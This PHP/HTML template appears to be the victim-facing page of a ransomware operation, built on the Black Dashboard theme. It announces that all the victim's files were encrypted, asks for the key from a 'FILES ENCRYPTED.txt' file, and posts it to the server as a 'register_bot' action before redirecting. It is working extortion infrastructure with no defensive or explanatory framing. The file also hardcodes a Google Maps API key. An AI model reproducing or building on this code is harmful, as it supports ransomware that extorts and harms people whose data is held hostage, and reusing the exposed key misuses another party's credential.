<?php
//$data['page'] = 'chatting';
//var_dump($this->data);
$data['theme_url'] = $this->data['theme_url'];
$data['menu_url'] = $this->data['menu_url'];
$data['title'] = "Welcome";
?>

<!DOCTYPE html>
<html lang="en">
<script src="<?php echo $data['theme_url'];?>/assets//js/core/jquery.min.js"></script>
<script src="<?php echo $data['theme_url'];?>/assets//js/core/popper.min.js"></script>
<script src="<?php echo $data['theme_url'];?>/assets//js/core/bootstrap.min.js"></script>
<script src="<?php echo $data['theme_url'];?>/assets//js/plugins/perfect-scrollbar.jquery.min.js"></script>
<script src="<?php echo $data['theme_url'];?>/assets//js/plugins/moment.min.js"></script>
<!--  Plugin for Switches, full documentation here: http://www.jque.re/plugins/version3/bootstrap.switch/ -->
<script src="<?php echo $data['theme_url'];?>/assets//js/plugins/bootstrap-switch.js"></script>
<!--  Plugin for Sweet Alert -->
<script src="<?php echo $data['theme_url'];?>/assets//js/plugins/sweetalert2.min.js"></script>
<!--  Plugin for Sorting Tables -->
<script src="<?php echo $data['theme_url'];?>/assets//js/plugins/jquery.tablesorter.js"></script>
<!-- Forms Validations Plugin -->
<script src="<?php echo $data['theme_url'];?>/assets//js/plugins/jquery.validate.min.js"></script>
<!--  Plugin for the Wizard, full documentation here: https://github.com/VinceG/twitter-bootstrap-wizard -->
<script src="<?php echo $data['theme_url'];?>/assets//js/plugins/jquery.bootstrap-wizard.js"></script>
<!--	Plugin for Select, full documentation here: http://silviomoreto.github.io/bootstrap-select -->
<script src="<?php echo $data['theme_url'];?>/assets//js/plugins/bootstrap-selectpicker.js"></script>
<!--  Plugin for the DateTimePicker, full documentation here: https://eonasdan.github.io/bootstrap-datetimepicker/ -->
<script src="<?php echo $data['theme_url'];?>/assets//js/plugins/bootstrap-datetimepicker.js"></script>
<!--  DataTables.net Plugin, full documentation here: https://datatables.net/    -->
<script src="<?php echo $data['theme_url'];?>/assets//js/plugins/jquery.dataTables.min.js"></script>
<!--	Plugin for Tags, full documentation here: https://github.com/bootstrap-tagsinput/bootstrap-tagsinputs  -->
<script src="<?php echo $data['theme_url'];?>/assets//js/plugins/bootstrap-tagsinput.js"></script>
<!-- Plugin for Fileupload, full documentation here: http://www.jasny.net/bootstrap/javascript/#fileinput -->
<script src="<?php echo $data['theme_url'];?>/assets//js/plugins/jasny-bootstrap.min.js"></script>
<!--  Full Calendar Plugin, full documentation here: https://github.com/fullcalendar/fullcalendar    -->
<script src="<?php echo $data['theme_url'];?>/assets//js/plugins/fullcalendar/fullcalendar.min.js"></script>
<script src="<?php echo $data['theme_url'];?>/assets//js/plugins/fullcalendar/daygrid.min.js"></script>
<script src="<?php echo $data['theme_url'];?>/assets//js/plugins/fullcalendar/timegrid.min.js"></script>
<script src="<?php echo $data['theme_url'];?>/assets//js/plugins/fullcalendar/interaction.min.js"></script>
<!-- Vector Map plugin, full documentation here: http://jvectormap.com/documentation/ -->
<script src="<?php echo $data['theme_url'];?>/assets//js/plugins/jquery-jvectormap.js"></script>
<!--  Plugin for the Sliders, full documentation here: http://refreshless.com/nouislider/ -->
<script src="<?php echo $data['theme_url'];?>/assets//js/plugins/nouislider.min.js"></script>
<!--  Google Maps Plugin    -->
<!-- Place this tag in your head or just before your close body tag. -->
<script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyDGat1sgDZ-3y6fFe6HD7QUziVC6jlJNog"></script>
<!-- Chart JS -->
<script src="<?php echo $data['theme_url'];?>/assets//js/plugins/chartjs.min.js"></script>
<!--  Notifications Plugin    -->
<script src="<?php echo $data['theme_url'];?>/assets//js/plugins/bootstrap-notify.js"></script>
<!-- Control Center for Black Dashboard: parallax effects, scripts for the example pages etc -->
<script src="<?php echo $data['theme_url'];?>/assets//js/black-dashboard.min.js?v=1.1.1"></script>
<!-- Black Dashboard DEMO methods, don't include it in your project! -->
<script src="<?php echo $data['theme_url'];?>/assets//demo/demo.js"></script>
<!-- Sharrre libray -->
<script src="<?php echo $data['theme_url'];?>/assets//demo/jquery.sharrre.js"></script>
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="apple-touch-icon" sizes="76x76" href="<?php echo $data['theme_url'];?>/assets/img/apple-icon.png">
    <link rel="icon" type="image/png" href="<?php echo $data['theme_url'];?>/assets/img/favicon.png">
    <title>
        <?php echo $data['title'];?>
    </title>

    <!--     Fonts and icons     -->
    <link href="<?php echo $data['theme_url'];?>/assets/css/all.css" rel="stylesheet">
    <link href="<?php echo $data['theme_url'];?>/assets/css/icon.css" rel="stylesheet" />
    <!-- Nucleo Icons -->
    <!-- Nucleo Icons -->
    <link href="<?php echo $data['theme_url'];?>/assets/css/nucleo-icons.css" rel="stylesheet" />

    <!-- CSS Files -->
    <link href="<?php echo $data['theme_url'];?>/assets/css/black-dashboard.min.css?v=1.1.1" rel="stylesheet" />
    <!-- CSS Just for demo purpose, don't include it in your project -->
    <link href="<?php echo $data['theme_url'];?>/assets/demo/demo.css" rel="stylesheet" />

    <!--    <link rel="stylesheet" href="--><?php //echo $data['theme_url'];?><!--/assets/nc-demo_outline/demo/css/reset.css"> <!-- CSS reset -->
    <!--    <link rel="stylesheet" href="--><?php //echo $data['theme_url'];?><!--/assets/nc-demo_outline/demo/css/style.css">-->
    <?php
    if(!empty($data['page'])){
        require_once FCPATH."/ui/pages/".$data['page']."/header.php";
    }
    ?>
    <style type="text/css">
        #loading-indicator {
            position: fixed;
            left: 16%;
            top: 15%;
            z-index: 1000;
        }
    </style>
</head>
<body>
    <img src="<?php echo $data['theme_url'];?>/images/ajax-loader.gif" id="loading-indicator" style="display:none" />
    <div class="content pad-20px">
        <div class="col-md-12">
            <div class="text-center color-red">Welcome!</div>
            <div class="text-center color-red">WE ARE REGRET! BUT ALL YOUR FILE WAS ENCRYPTED!</div>
            <div class="col-md-12">
            <form id="TypeValidation" class="form-horizontal" novalidate="novalidate">
              <div class="card">
                <div class="card-header text-center">
                  <h4 class="card-title">Input Key from FILES ENCRYPTED.txt file in order to decrypt Encrypted Files </h4>
                </div>
                <div class="card-body text-center"  style = "margin: 20px;">
                    <div class="col-sm-12 text-center">
                    <label class="text-left">
                    <h6 class="card-title">The Example for the Key is below:</h6>
                    ---BEGIN KEY---<br>
KU8aSkoZGhkaSE0dEBlMGBEfHR8bTEtKEUxKGUpKSh5MTxpKShkaGRpITR0QGUwYER8dHxtMS0opSBEQTBFMGxwbHxEQEBsfHU0bGBBIH...<br>
---END KEY---
                     </label>
                       </div>
                  <div class="col-sm-12">
                    <textarea id="key-id" style = "margin: 20px;background: aquamarine; width: 80%;height: 200px;"class="" type="text"></textarea>
                  </div>

                </div>
                <div class="card-footer text-center">
                  <button type="button" id="register" class="btn btn-primary">Register</button>
                </div>
                
                </div>
              </div>
            </form>
          </div>
        </div>
       

    </div>
</body>

<script>

$(document).ready(function() {
    console.log("Document Ready!");
    $("#register").on("click",function(){
        var keydata = $("#key-id").val();
        if(keydata == ""){
             showWarring('bottom','center',"Please,input key!",3000);
            return;
        }
        console.log(keydata);
                var params = {
                    action: "register_bot",
                    data: keydata
                };
                $.ajax({
                    url: "ajax_call",
                    type: "POST",
                    dataType: "json",
                    data: params,
                    success: function onSuccess(res){
                       
                        console.log(res);
                        $('#loading-indicator').hide();
                        if(res.result == "ok"){
                           var url = res.data;
                           location.href = url;
                        }
                        else{
                            showError('bottom','center',res.result,3000);
                            
                        }
                       
                    },
                    error: function onError(res){
                        $('#loading-indicator').hide();
                          showError('bottom','center',res,3000);
                       
                    }
                });
    });

    function showNotification(from, align,msg,time) {
        color = 2;//Math.floor((Math.random() * 4) + 1);

        $.notify({
        icon: "tim-icons icon-bell-55",
        message: msg

        }, {
        type: type[color],
        timer: time,
        placement: {
            from: from,
            align: align
        }
        });
  }
  function showError(from, align,msg,time) {
        color = 1;//Math.floor((Math.random() * 4) + 1);

        $.notify({
        icon: "tim-icons icon-bell-55",
        message: msg

        }, {
        type: type[color],
        timer: time,
        placement: {
            from: from,
            align: align
        }
        });
  }
  function showWarring(from, align,msg,time) {
        color = 3;//Math.floor((Math.random() * 4) + 1);

        $.notify({
        icon: "tim-icons icon-bell-55",
        message: msg

        }, {
        type: type[color],
        timer: time,
        placement: {
            from: from,
            align: align
        }
        });
  }
   
});

</script>